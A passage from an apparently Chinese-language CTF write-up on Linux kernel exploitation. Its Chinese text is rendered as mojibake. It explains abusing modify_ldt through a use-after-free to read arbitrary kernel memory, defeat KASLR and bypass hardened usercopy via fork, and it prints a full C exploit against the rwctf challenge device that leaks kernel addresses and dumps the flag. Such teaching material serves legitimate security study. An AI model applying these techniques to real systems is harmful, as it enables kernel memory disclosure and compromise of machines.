class="hljs-type">int</span> , func , <span class="hljs-type">void</span> __user * , ptr ,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> , bytecount)<br>&#123;<br>    <span class="hljs-type">int</span> ret = -ENOSYS;<br><br>    <span class="hljs-keyword">switch</span> (func) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        ret = read_ldt(ptr, bytecount);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        ret = write_ldt(ptr, bytecount, <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        ret = read_default_ldt(ptr, bytecount);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x11</span>:<br>        ret = write_ldt(ptr, bytecount, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span><br><span class="hljs-comment">     * return type, but tht ABI for sys_modify_ldt() expects</span><br><span class="hljs-comment">     * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span><br><span class="hljs-comment">     * for the return code.  The &#x27;unsigned&#x27; is necessary so</span><br><span class="hljs-comment">     * the compiler does not try to sign-extend the negative</span><br><span class="hljs-comment">     * return codes into the high half of the register when</span><br><span class="hljs-comment">     * taking the value from int-&gt;long.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å¯¹äº <code>write_ldt()</code> è€Œè¨€å…¶æœ€ç»ˆä¼šè°ƒç”¨ <code>alloc_ldt_struct()</code> åˆ†é… ldt ç»“æ„ä½“ï¼Œç”±äºèµ°çš„æ˜¯é€šç”¨çš„åˆ†é…è·¯å¾„æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è¯¥ç»“æ„ä½“ä¸Šå®Œæˆ UAF ï¼šï¼‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The caller must call finalize_ldt_struct on the result. LDT starts zeroed. */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> ldt_struct *<span class="hljs-title function_">alloc_ldt_struct</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_entries)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ldt_struct</span> *<span class="hljs-title">new_ldt</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_size;<br><br>    <span class="hljs-keyword">if</span> (num_entries &gt; LDT_ENTRIES)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    new_ldt = kmalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ldt_struct), GFP_KERNEL);<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>

<p>è€Œ <code>read_ldt()</code> å°±æ˜¯ç®€å•çš„è¯»å‡º LDT è¡¨ä¸Šå†…å®¹åˆ°ç”¨æˆ·ç©ºé—´ï¼Œç”±äºæˆ‘ä»¬æœ‰æ— é™åˆ¶çš„ UAFï¼Œæ•…å¯ä»¥<strong>ä¿®æ”¹ ldt-&gt;entries å®Œæˆå†…æ ¸ç©ºé—´ä¸­çš„ä»»æ„åœ°å€è¯»</strong>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">read_ldt</span><span class="hljs-params">(<span class="hljs-type">void</span> __user *ptr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bytecount)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>    <span class="hljs-keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;<br>        retval = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out_unlock;<br>    &#125;<br><span class="hljs-comment">//...</span><br>out_unlock:<br>    up_read(&amp;mm-&gt;context.ldt_usr_sem);<br>    <span class="hljs-keyword">return</span> retval;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>read_ldt()</code> è¿˜èƒ½å¸®åŠ©æˆ‘ä»¬ç»•è¿‡ KASLR ï¼Œè¿™é‡Œæˆ‘ä»¬è¦ç”¨åˆ° <code>copy_to_user()</code> çš„ä¸€ä¸ªç‰¹æ€§ï¼šå¯¹äºéæ³•åœ°å€ï¼Œå…¶<strong>å¹¶ä¸ä¼šé€ æˆ kernel panicï¼Œåªä¼šè¿”å›ä¸€ä¸ªéé›¶çš„é”™è¯¯ç </strong>ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥å¤šæ¬¡ä¿®æ”¹ ldt-&gt;entries å¹¶å¤šæ¬¡è°ƒç”¨ modify_ldt() ä»¥<strong>çˆ†ç ´å†…æ ¸çš„ page_offset_base</strong>ï¼Œè‹¥æ˜¯æˆåŠŸå‘½ä¸­ï¼Œåˆ™ modify_ldt ä¼šè¿”å›ç»™æˆ‘ä»¬ä¸€ä¸ªéè´Ÿå€¼</p>
<p>ä¸è¿‡ç”±äº hardened usercopy çš„å­˜åœ¨ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½å¤Ÿç›´æ¥è¯»å–å†…æ ¸ä»£ç æ®µæˆ–æ˜¯çº¿æ€§æ˜ å°„åŒºä¸­å¤§å°ä¸ç¬¦çš„å¯¹è±¡çš„å†…å®¹ï¼Œå¦åˆ™ä¼šé€ æˆ kernel panic ï¼š( </p>
<h5 id="Step-II-åˆ©ç”¨-fork-ç»•è¿‡-hardened-usercopy"><a href="#Step-II-åˆ©ç”¨-fork-ç»•è¿‡-hardened-usercopy" class="headerlink" title="Step.II - åˆ©ç”¨ fork ç»•è¿‡ hardened usercopy"></a>Step.II - åˆ©ç”¨ fork ç»•è¿‡ hardened usercopy</h5><p>è™½ç„¶åœ¨ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´ä¹‹é—´çš„æ•°æ®æ‹·è´å­˜åœ¨ hardened usercopyï¼Œ<strong>ä½†æ˜¯åœ¨å†…æ ¸ç©ºé—´åˆ°å†…æ ¸ç©ºé—´çš„æ•°æ®æ‹·è´é—´å¹¶ä¸å­˜åœ¨ç±»ä¼¼çš„ä¿æŠ¤æœºåˆ¶</strong>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›æ‰‹æ®µç»•è¿‡ hardended usercopy</p>
<p>é˜…è¯» Linux å†…æ ¸æºç ï¼Œæˆ‘ä»¬ä¸éš¾è§‚å¯Ÿåˆ°å½“è¿›ç¨‹è°ƒç”¨ <code>fork()</code>  æ—¶ï¼Œå†…æ ¸ä¼šé€šè¿‡ <code>memcpy()</code> å°†çˆ¶è¿›ç¨‹çš„ <code>ldt-&gt;entries</code> ä¸Šçš„å†…å®¹æ‹·è´ç»™å­è¿›ç¨‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span><br><span class="hljs-comment"> * the new task is not running, so nothing can be installed.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ldt_dup_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *old_mm, <span class="hljs-keyword">struct</span> mm_struct *mm)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,<br>           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);<br><br>       <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¯¥æ“ä½œ<strong>æ˜¯å®Œå…¨å¤„åœ¨å†…æ ¸ä¸­çš„æ“ä½œ</strong>ï¼Œå› æ­¤ä¸ä¼šè§¦å‘ hardened usercopy çš„æ£€æŸ¥ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨çˆ¶è¿›ç¨‹ä¸­è®¾å®šå¥½æœç´¢çš„åœ°å€ä¹‹åå†å¼€å­è¿›ç¨‹æ¥ç”¨ read_ldt() è¯»å–æ•°æ®å³å¯ï¼šï¼‰</p>
<h4 id="â‘¢-FINAL-EXPLOIT-4"><a href="#â‘¢-FINAL-EXPLOIT-4" class="headerlink" title="â‘¢ FINAL EXPLOIT"></a>â‘¢ FINAL EXPLOIT</h4><p>æœ€åçš„ exp å¦‚ä¸‹ï¼Œè¿™ä¹Ÿæ˜¯ç¬”è€…åœ¨æ¯”èµ›æ—¶æ‰€ç”¨çš„è§£æ³•ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/ldt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> idx;<br>    <span class="hljs-type">uint32_t</span> size;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] %s \n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">alloc</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> idx, <span class="hljs-type">uint32_t</span> size, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> <span class="hljs-title">n</span> =</span> &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br><br>    ioctl(dev_fd, <span class="hljs-number">0xDEADBEEF</span>, &amp;n);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> <span class="hljs-title">n</span> =</span> &#123;<br>        .idx = idx,<br>    &#125;;<br><br>    ioctl(dev_fd, <span class="hljs-number">0xC0DECAFE</span>, &amp;n);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_desc</span> <span class="hljs-title">desc</span>;</span><br>    <span class="hljs-type">uint64_t</span> page_offset_base = <span class="hljs-number">0xffff888000000000</span>;<br>    <span class="hljs-type">uint64_t</span> secondary_startup_64;<br>    <span class="hljs-type">uint64_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset;<br>    <span class="hljs-type">uint64_t</span> search_addr, flag_addr = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">uint64_t</span> temp;<br>    <span class="hljs-type">uint64_t</span> ldt_buf[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">char</span> *buf;<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> retval;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    <span class="hljs-comment">/* bind to CPU core 0 */</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/rwctf&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open the /dev/rwctf file!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* init descriptor info */</span><br>    desc.base_addr = <span class="hljs-number">0xff0000</span>;<br>    desc.entry_number = <span class="hljs-number">0x8000</span> / <span class="hljs-number">8</span>;<br>    desc.limit = <span class="hljs-number">0</span>;<br>    desc.seg_32bit = <span class="hljs-number">0</span>;<br>    desc.contents = <span class="hljs-number">0</span>;<br>    desc.limit_in_pages = <span class="hljs-number">0</span>;<br>    desc.lm = <span class="hljs-number">0</span>;<br>    desc.read_exec_only = <span class="hljs-number">0</span>;<br>    desc.seg_not_present = <span class="hljs-number">0</span>;<br>    desc.useable = <span class="hljs-number">0</span>;<br><br>    alloc(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&quot;arttnba3rat3bant&quot;</span>);<br>    del(<span class="hljs-number">0</span>);<br>    syscall(SYS_modify_ldt, <span class="hljs-number">1</span>, &amp;desc, <span class="hljs-keyword">sizeof</span>(desc));<br><br>    <span class="hljs-comment">/* leak kernel direct mapping area by modify_ldt() */</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>        ldt_buf[<span class="hljs-number">0</span>] = page_offset_base;<br>        ldt_buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0x8000</span> / <span class="hljs-number">8</span>;<br>        del(<span class="hljs-number">0</span>);<br>        alloc(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, ldt_buf);<br>        retval = syscall(SYS_modify_ldt, <span class="hljs-number">0</span>, &amp;temp, <span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span> (retval &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] read data: 0x%lx\n&quot;</span>, temp);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (retval == <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;no mm-&gt;context.ldt!&quot;</span>);<br>        &#125;<br>        page_offset_base += <span class="hljs-number">0x1000000</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Found page_offset_base: 0x%lx\n&quot;</span>, page_offset_base);<br><br>    <span class="hljs-comment">/* leak kernel base from direct mappinig area by modify_ldt() */</span><br>    ldt_buf[<span class="hljs-number">0</span>] = page_offset_base + <span class="hljs-number">0x9d000</span>;<br>    ldt_buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0x8000</span> / <span class="hljs-number">8</span>;<br>    del(<span class="hljs-number">0</span>);<br>    alloc(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, ldt_buf);<br>    syscall(SYS_modify_ldt, <span class="hljs-number">0</span>, &amp;secondary_startup_64, <span class="hljs-number">8</span>);<br>    kernel_offset = secondary_startup_64 - <span class="hljs-number">0xffffffff81000060</span>;<br>    kernel_base += kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Get  secondary_startup_64: 0x%lx\n&quot;</span>, secondary_startup_64);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel_base: 0x%lx\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel_offset: 0x%lx\n&quot;</span>, kernel_offset);<br><br>    <span class="hljs-comment">/* search for flag in kernel space */</span><br>    search_addr = page_offset_base;<br>    pipe(pipe_fd);<br>    buf = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x8000</span>, <br>                        PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <br>                        <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>        ldt_buf[<span class="hljs-number">0</span>] = search_addr;<br>        ldt_buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0x8000</span> / <span class="hljs-number">8</span>;<br>        del(<span class="hljs-number">0</span>);<br>        alloc(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, ldt_buf);<br>        <span class="hljs-type">int</span> ret = fork();<br>        <span class="hljs-keyword">if</span> (!ret) &#123; <span class="hljs-comment">// child</span><br>            <span class="hljs-type">char</span> *result_addr;<br><br>            syscall(SYS_modify_ldt, <span class="hljs-number">0</span>, buf, <span class="hljs-number">0x8000</span>);<br>            result_addr = memmem(buf, <span class="hljs-number">0x8000</span>, <span class="hljs-string">&quot;rwctf&#123;&quot;</span>, <span class="hljs-number">6</span>);<br>            <span class="hljs-keyword">if</span> (result_addr) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span>; i++) &#123;<br>                    <span class="hljs-keyword">if</span> (result_addr[i] == <span class="hljs-string">&#x27;&#125;&#x27;</span>) &#123;<br>                        flag_addr = search_addr + (<span class="hljs-type">uint64_t</span>)(result_addr - buf);<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Found flag at addr: 0x%lx\n&quot;</span>, flag_addr);<br>                    &#125;<br>                &#125;<br>            &#125;<br>            write(pipe_fd[<span class="hljs-number">1</span>], &amp;flag_addr, <span class="hljs-number">8</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        wait(<span class="hljs-literal">NULL</span>);<br>        read(pipe_fd[<span class="hljs-number">0</span>], &amp;flag_addr, <span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span> (flag_addr != <span class="hljs-number">-1</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        search_addr += <span class="hljs-number">0x8000</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* read flag */</span><br>    <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(flag));<br>    ldt_buf[<span class="hljs-number">0</span>] = flag_addr;<br>    ldt_buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0x8000</span> / <span class="hljs-number">8</span>;<br>    del(<span class="hljs-number">0</span>);<br>    alloc(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, ldt_buf);<br>    syscall(SYS_modify_ldt, <span class="hljs-number">0</span>, flag, <span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] flag: %s\n&quot;</span>, flag);<br><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾— flagï¼š</p>
<p><img src="https://s2.loli.net/2023/02/20/7Qs1gHdklStc2Zb.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="åˆ©ç”¨-pt-regs-æ„é€ é€šç”¨-kernel-ROPï¼ˆmay-obsoleteï¼‰"><a href="#åˆ©ç”¨-pt-regs-æ„é€ é€šç”¨-kernel-ROPï¼ˆmay-obsoleteï¼‰" class="headerlink" title="åˆ©ç”¨ pt_regs æ„é€ é€šç”¨ kernel ROPï¼ˆmay obsoleteï¼‰"></a><em>åˆ©ç”¨ pt_regs æ„é€ é€šç”¨ kernel ROPï¼ˆmay obsoleteï¼‰</em></h2><h3 id="pre-å‰ç½®æ¡ä»¶"><a href="#pre-å‰ç½®æ¡ä»¶" class="headerlink" title="pre.å‰ç½®æ¡ä»¶"></a>pre.å‰ç½®æ¡ä»¶</h3><p>å¯ä»¥æ§åˆ¶å†…æ ¸æ‰§è¡Œæµï¼ˆåŠ«æŒè‡³å°‘ä¸€ä¸ªæŒ‡é’ˆï¼‰ï¼Œï¼ˆå¯é€‰ï¼‰å·²ç»æ³„éœ²å†…æ ¸åŸºå€</p>
<h3 id="ç³»ç»Ÿè°ƒç”¨-ä¸-pt-regs-ç»“æ„ä½“"><a href="#ç³»ç»Ÿè°ƒç”¨-ä¸-pt-regs-ç»“æ„ä½“" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨ ä¸ pt_regs ç»“æ„ä½“"></a>ç³»ç»Ÿè°ƒç”¨ ä¸ pt_regs ç»“æ„ä½“</h3><p>ç³»ç»Ÿè°ƒç”¨çš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿæˆ–è®¸ä¸å°‘äººéƒ½èƒ½å¤Ÿç­”å¾—ä¸Šæ¥æ˜¯ç”±æˆ‘ä»¬åœ¨ç”¨æˆ·æ€å¸ƒç½®å¥½ç›¸åº”çš„å‚æ•°åæ‰§è¡Œ <code>syscall</code> è¿™ä¸€æ±‡ç¼–æŒ‡ä»¤ï¼Œé€šè¿‡é—¨ç»“æ„è¿›å…¥åˆ°å†…æ ¸ä¸­çš„ <code>entry_SYSCALL_64</code>è¿™ä¸€å‡½æ•°ï¼Œéšåé€šè¿‡ç³»ç»Ÿè°ƒç”¨è¡¨è·³è½¬åˆ°å¯¹åº”çš„å‡½æ•°</p>
<p>ç°åœ¨è®©æˆ‘ä»¬å°†ç›®å…‰æ”¾åˆ° <code>entry_SYSCALL_64</code> è¿™ä¸€ç”¨æ±‡ç¼–å†™çš„å‡½æ•°å†…éƒ¨ï¼Œè§‚å¯Ÿï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°å…¶æœ‰ç€<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/entry_64.S#L107">è¿™æ ·ä¸€æ¡æŒ‡ä»¤</a>ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">PUSH_AND_CLEAR_REGS rax=$-ENOSYS<br></code></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä¸€æ¡ååˆ†æœ‰è¶£çš„æŒ‡ä»¤ï¼Œå®ƒä¼šå°†æ‰€æœ‰çš„å¯„å­˜å™¨<strong>å‹å…¥å†…æ ¸æ ˆä¸Šï¼Œå½¢æˆä¸€ä¸ª pt_regs ç»“æ„ä½“</strong>ï¼Œè¯¥ç»“æ„ä½“å®è´¨ä¸Šä½äºå†…æ ¸æ ˆåº•ï¼Œ<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44">å®šä¹‰</a>å¦‚ä¸‹ï¼š</p>
